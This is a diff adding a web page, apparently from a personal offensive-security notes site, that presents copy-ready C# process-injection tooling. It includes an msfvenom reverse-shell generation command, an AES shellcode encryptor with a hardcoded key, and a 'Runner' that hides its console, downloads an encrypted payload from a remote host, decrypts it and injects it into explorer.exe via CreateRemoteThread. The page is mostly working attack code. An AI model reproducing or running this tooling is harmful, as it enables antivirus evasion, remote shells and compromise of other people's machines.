+        byte[] key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes("MyK3yG0o0zH3r3"));
+        Enc = Encrypt.AES_Decrypt(Enc, key);
+        string procName = "explorer"; // this is the process to be injected, change if needed
+        int remoteProcId = GetPid(procName);
+        TimeSpan ts = new TimeSpan(0, 0, 10); // Delay Execution for 10 seconds
+        Thread.Sleep(ts);
+        InjectShellcode(Enc, remoteProcId);
+
+    }
+
+    static int GetPid(string procName)
+    {
+        int remoteProcId = 0;
+        Process[] procs = Process.GetProcesses();
+        foreach (Process proc in procs)
+        {
+            if (proc.ProcessName == procName)
+            {
+                remoteProcId = proc.Id;
+                break;
+            }
+        }
+        return remoteProcId;
+    }
+
+    static void InjectShellcode(byte[] shellcode, int remoteProcId)
+    {
+        IntPtr hProcess = Win32.OpenProcess(Win32.PROCESS_CREATE_THREAD | Win32.PROCESS_QUERY_INFORMATION | Win32.PROCESS_VM_OPERATION |
+            Win32.PROCESS_VM_WRITE | Win32.PROCESS_VM_READ, false, remoteProcId);
+
+        IntPtr spaceAddr = Win32.VirtualAllocEx(hProcess, IntPtr.Zero, shellcode.Length, Win32.MEM_COMMIT, Win32.PAGE_READWRITE);
+        Win32.WriteProcessMemory(hProcess, spaceAddr, shellcode, new IntPtr(shellcode.Length), 0);
+        int oldProtect;
+        Win32.VirtualProtectEx(hProcess, spaceAddr, (UIntPtr)shellcode.Length, Win32.PAGE_EXECUTE_READ, out oldProtect);
+        Win32.CreateRemoteThread(hProcess, IntPtr.Zero, 0, spaceAddr, IntPtr.Zero, 0, IntPtr.Zero);
+    }
+}
+
+class Encrypt
+{
+    public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
+    {
+        byte[] decryptedBytes = null;
+        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
+        using (MemoryStream ms = new MemoryStream())
+        {
+            using (RijndaelManaged AES = new RijndaelManaged())
+            {
+                AES.KeySize = 256;
+                AES.BlockSize = 128;
+                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
+                AES.Key = key.GetBytes(AES.KeySize / 8);
+                AES.IV = key.GetBytes(AES.BlockSize / 8);
+                AES.Mode = CipherMode.CBC;
+                using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
+                {
+                    cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
+                    cs.Close();
+                }
+                decryptedBytes = ms.ToArray();
+            }
+        }
+        return decryptedBytes;
+    }
+}                    
+                    </code>
+                    </pre>
+                </div>
+            </details>
+            <br>
+            <details class="bg-gray-800 bg-opacity-50 p-4 rounded-lg group">
+                <summary class="flex items-center justify-between text-xl font-semibold text-indigo-300 cursor-pointer ">
+                    <span>Download From Remote</span>
+                    <svg class="w-6 h-6 transform transition-transform duration-200 group-open:rotate-180 text-indigo-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"/>
+                    </svg>
+                    
+                </summary>
+                <p class="mb-4 text-sm text-slate-400">Don't for get to start http server if its on your local host..</p>
+                <br>
+                <details class="bg-gray-800 bg-opacity-50 p-4 rounded-lg group">
+                    <summary class="flex items-center justify-between text-xl font-semibold text-red-300 cursor-pointer ">
+                        <span>Encryption</span>
+                        <svg class="w-6 h-6 transform transition-transform duration-200 group-open:rotate-180 text-indigo-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"/>
+                        </svg>
+                    </summary>
+                    <div class="mt-4 relative ">
+                        <button class="absolute top-2 right-2 bg-indigo-500 text-white px-3 py-1 rounded text-sm" onclick="copyCode(this)">Copy</button>
+                        <pre class="mt-8 overflow-x-auto bg-gray-900 p-4 rounded-lg shadow-inner ">
+                            <code class="language-csharp text-green-300  ">
+// Project Name: Process Injection - Encryption
+// msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=443 EXITFUNC=thread -f raw -o injection.bin
+// This will create a new file: injection.enc
+// By: Iron Hulk
+
+using System;
+using System.IO;
+using System.Text;
+using System.Security.Cryptography;
+
+public static class Encryptor
+{
+    private const int Iterations = 1000;
+    private static readonly byte[] Salt = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
+
+    public static int Main(string[] args)
+    {
+        if (args.Length != 1)
+        {
+            Console.WriteLine("[!] Usage: encrypt_shellcode_to_file file");
+            return 1;
+        }
+
+        string inputPath = args[0];
+        if (!File.Exists(inputPath))
+        {
+            Console.WriteLine("[!] File not found: {0}", inputPath);
+            return 2;
+        }
+
+        byte[] plain = File.ReadAllBytes(inputPath);
+        Console.WriteLine("[<] Shellcode Length: {0} Bytes", plain.Length);
+
+        byte[] passwordBytes;
+        using (SHA256 sha = SHA256.Create())
+        {
+            passwordBytes = sha.ComputeHash(Encoding.UTF8.GetBytes("MyK3yG0o0zH3r3")); // ← Encryption Key
+        }
+
+        byte[] encrypted = EncryptAes(plain, passwordBytes);
+        Console.WriteLine("[+] Encrypted Shellcode Length: {0} Bytes", encrypted.Length);
+
+        string outPath = Path.ChangeExtension(inputPath, ".enc"); // ← save as .enc
+        File.WriteAllBytes(outPath, encrypted);
+        Console.WriteLine("[>] Encrypted Shellcode Saved in {0}", outPath);
+
+        Console.WriteLine(ToByteArrayLiteral("encryptedShellcode", encrypted));
+        return 0;
+    }
+
+    private static byte[] EncryptAes(byte[] data, byte[] passwordBytes)
+    {
+        using (var derive = new Rfc2898DeriveBytes(passwordBytes, Salt, Iterations))
+        using (Aes aes = Aes.Create())
+        {
+            aes.KeySize = 256;
+            aes.BlockSize = 128;
+            aes.Mode = CipherMode.CBC;
+            aes.Key = derive.GetBytes(aes.KeySize / 8);
+            aes.IV = derive.GetBytes(aes.BlockSize / 8);
+
+            using (var ms = new MemoryStream())
+            using (var cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
+            {
+                cs.Write(data, 0, data.Length);
+                cs.FlushFinalBlock();
+                return ms.ToArray();
+            }
+        }
+    }
+
+    private static string ToByteArrayLiteral(string name, byte[] bytes)
+    {
+        var sb = new StringBuilder();
+        sb.Append($"byte[] {name} = new byte[] {{ ");
+        for (int i = 0; i < bytes.Length; i++)
+        {
+            sb.Append("0x").Append(bytes[i].ToString("X2"));
+            if (i < bytes.Length - 1) sb.Append(", ");
+        }
+        sb.Append(" };");
+        return sb.ToString();
+    }
+}
+                            </code>
+                        </pre>
+                    </div>
+                </details>
+                <br>
+                <details class="bg-gray-800 bg-opacity-50 p-4 rounded-lg group">
+                    <summary class="flex items-center justify-between text-xl font-semibold text-green-300 cursor-pointer ">
+                        <span>Runner</span>
+                        <svg class="w-6 h-6 transform transition-transform duration-200 group-open:rotate-180 text-indigo-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"/>
+                        </svg>
+                    </summary>
+                    <div class="mt-4 relative ">
+                        <button class="absolute top-2 right-2 bg-indigo-500 text-white px-3 py-1 rounded text-sm" onclick="copyCode(this)">Copy</button>
+                        <pre class="mt-8 overflow-x-auto bg-gray-900 p-4 rounded-lg shadow-inner ">
+                        <code class="language-csharp text-green-300  ">
+// Project Name: Process Injection - Download -> Decryption -> Inject -> Run
+// By: Iron Hulk
+
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
+using System.Threading;
+
+class W
+{
+    [DllImport("kernel32")]
+    public static extern IntPtr GetConsoleWindow();
+
+    [DllImport("kernel32")]
+    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, int flAllocationType, int flProtect);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("user32")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+    public const int PROCESS_CREATE_THREAD = 0x0002;
+    public const int PROCESS_QUERY_INFORMATION = 0x0400;
+    public const int PROCESS_VM_OPERATION = 0x0008;
+    public const int PROCESS_VM_WRITE = 0x0020;
+    public const int PROCESS_VM_READ = 0x0010;
+    public const int MEM_COMMIT = 0x1000;
+    public const int PAGE_EXECUTE_READWRITE = 0x40;
+    public const int SW_HIDE = 0;
+
+    public static void HideWindow(IntPtr handle)
+    {
+        ShowWindow(handle, SW_HIDE);
+    }
+}
+
+class Program
+{
+    public static void Main(string[] a)
+    {
+        IntPtr h = W.GetConsoleWindow();
+        W.HideWindow(h);
+
+        // Download encrypted payload
+        byte[] encryptedPayload = DownloadPayload("http://10.10.10.10/injection.enc"); // ← CHANGE THIS
+
+        // Get decryption key
+        byte[] key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes("MyK3yG0o0zH3r3")); // ← Decryption key
+
+        // Decrypt payload
+        byte[] decryptedPayload = Decryption.AES_Decrypt(encryptedPayload, key);
+
+        string procName = "explorer"; // ← The targeted process
+        int r = GetPid(procName);
+
+        Thread.Sleep(new TimeSpan(0, 0, 2)); // ← Deley execution for 2 seconds
+
+        // Inject into target process
+        InjectShellcode(decryptedPayload, r);
+    }
+
+    static byte[] DownloadPayload(string url)
+    {
+        using (WebClient client = new WebClient())
+        {
+            return client.DownloadData(url);
+        }
+    }
+
+    static int GetPid(string procName)
+    {
+        foreach (Process proc in Process.GetProcesses())
+        {
+            if (proc.ProcessName.Equals(procName, StringComparison.OrdinalIgnoreCase))
+            {
+                return proc.Id;
+            }
+        }
+        return 0;
+    }
+
+    static void InjectShellcode(byte[] shellcode, int remoteProcId)
+    {
+        IntPtr hProcess = W.OpenProcess(
+            W.PROCESS_CREATE_THREAD | W.PROCESS_QUERY_INFORMATION |
+            W.PROCESS_VM_OPERATION | W.PROCESS_VM_WRITE | W.PROCESS_VM_READ,
+            false,
+            remoteProcId
+        );
+
+        IntPtr spaceAddr = W.VirtualAllocEx(
+            hProcess,
+            IntPtr.Zero,
+            shellcode.Length,
+            W.MEM_COMMIT,
+            W.PAGE_EXECUTE_READWRITE
+        );
+
+        W.WriteProcessMemory(
+            hProcess,
+            spaceAddr,
+            shellcode,
+            new IntPtr(shellcode.Length),
+            0
+        );
+
+        W.CreateRemoteThread(
+            hProcess,
+            IntPtr.Zero,
+            0,
+            spaceAddr,
+            IntPtr.Zero,
+            0,
+            IntPtr.Zero
+        );
+    }
+}
+
+class Decryption
+{
+    public static byte[] AES_Decrypt(byte[] encryptedData, byte[] passwordBytes)
+    {
+        byte[] salt = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
+        const int iterations = 1000;
+
+        using (Aes aes = Aes.Create())
+        {
+            aes.KeySize = 256;
+            aes.BlockSize = 128;
+            aes.Mode = CipherMode.CBC;
+
+            using (var deriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, iterations))
+            {
+                aes.Key = deriveBytes.GetBytes(aes.KeySize / 8);
+                aes.IV = deriveBytes.GetBytes(aes.BlockSize / 8);
+            }
+
+            using (var ms = new MemoryStream())
+            {
+                using (var cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
+                {
+                    cs.Write(encryptedData, 0, encryptedData.Length);
+                }
+                return ms.ToArray();
+            }
+        }
+    }
+}
+                            </code>
+                        </pre>
+                    </div>
+                </details>
+            </details>
+        </div>
+    </div>
+    <style>
+        .copy-button 
+        {
+          position: absolute;
+          top: 10px;
+          right: 15px;
+          background-color: #1e293b;
+          color: #f8fafc;
+          border: none;
+          padding: 5px 10px;
+          font-size: 18px;
+          cursor: pointer;
+          border-radius: 5px;
+          z-index: 2;
+        }              
+        .copy-button:hover 
+        {
+          background-color: #3b82f6;
+        }              
+      </style>
+      <script>
+        function copyCode(button) {
+          const codeBlock = button.parentElement.querySelector('code');
+          const text = codeBlock.textContent;
+      
+          navigator.clipboard.writeText(text).then(() => {
+            button.textContent = 'Copied!';
+            setTimeout(() => {
+              button.textContent = 'Copy';
+            }, 1500);
+          });
+        }
+      </script>     
+
+    <footer class="relative flex items-center justify-center text-[15px] text-slate-300 py-6">
+    <div class="text-center">
+        Crafted With Passion<br>
+        2025 Iron Hulk — No Rights Reserved.
+        <br>
+        <a href="../index.html" class="text-slate-300 text-sm px-4 py-2 rounded transition">← Back to Dashboard</a>
+    </div>
+    <a href="#top" class="absolute right-6 top-1/2 transform -translate-y-1/2 text-slate-300 hover:text-slate-700">
+        <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5" viewBox="0 0 20 20" fill="currentColor">
+        <path fill-rule="evenodd" d="M3.707 10.707a1 1 0 01-1.414-1.414l7-7a1 1 0 011.414 0l7 7a1 1 0 11-1.414 1.414L11 4.414V19a1 1 0 11-2 0V4.414L3.707 10.707z" clip-rule="evenodd" />
+        </svg>
+    </a>
+    </footer>
+  <!-- Reading-time logic -->
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const dateWritten = '20/July/2025';
+      const words   = document.getElementById('article').innerText.trim().split(/\s+/).filter(Boolean).length;
+      const minutes = Math.max(1, Math.ceil(words / 230));
+      document.getElementById('reading-time').textContent = `Written: ${dateWritten} – ${minutes} min reading`;
+    });
+  </script>
+</main>
+</body>
+</html>
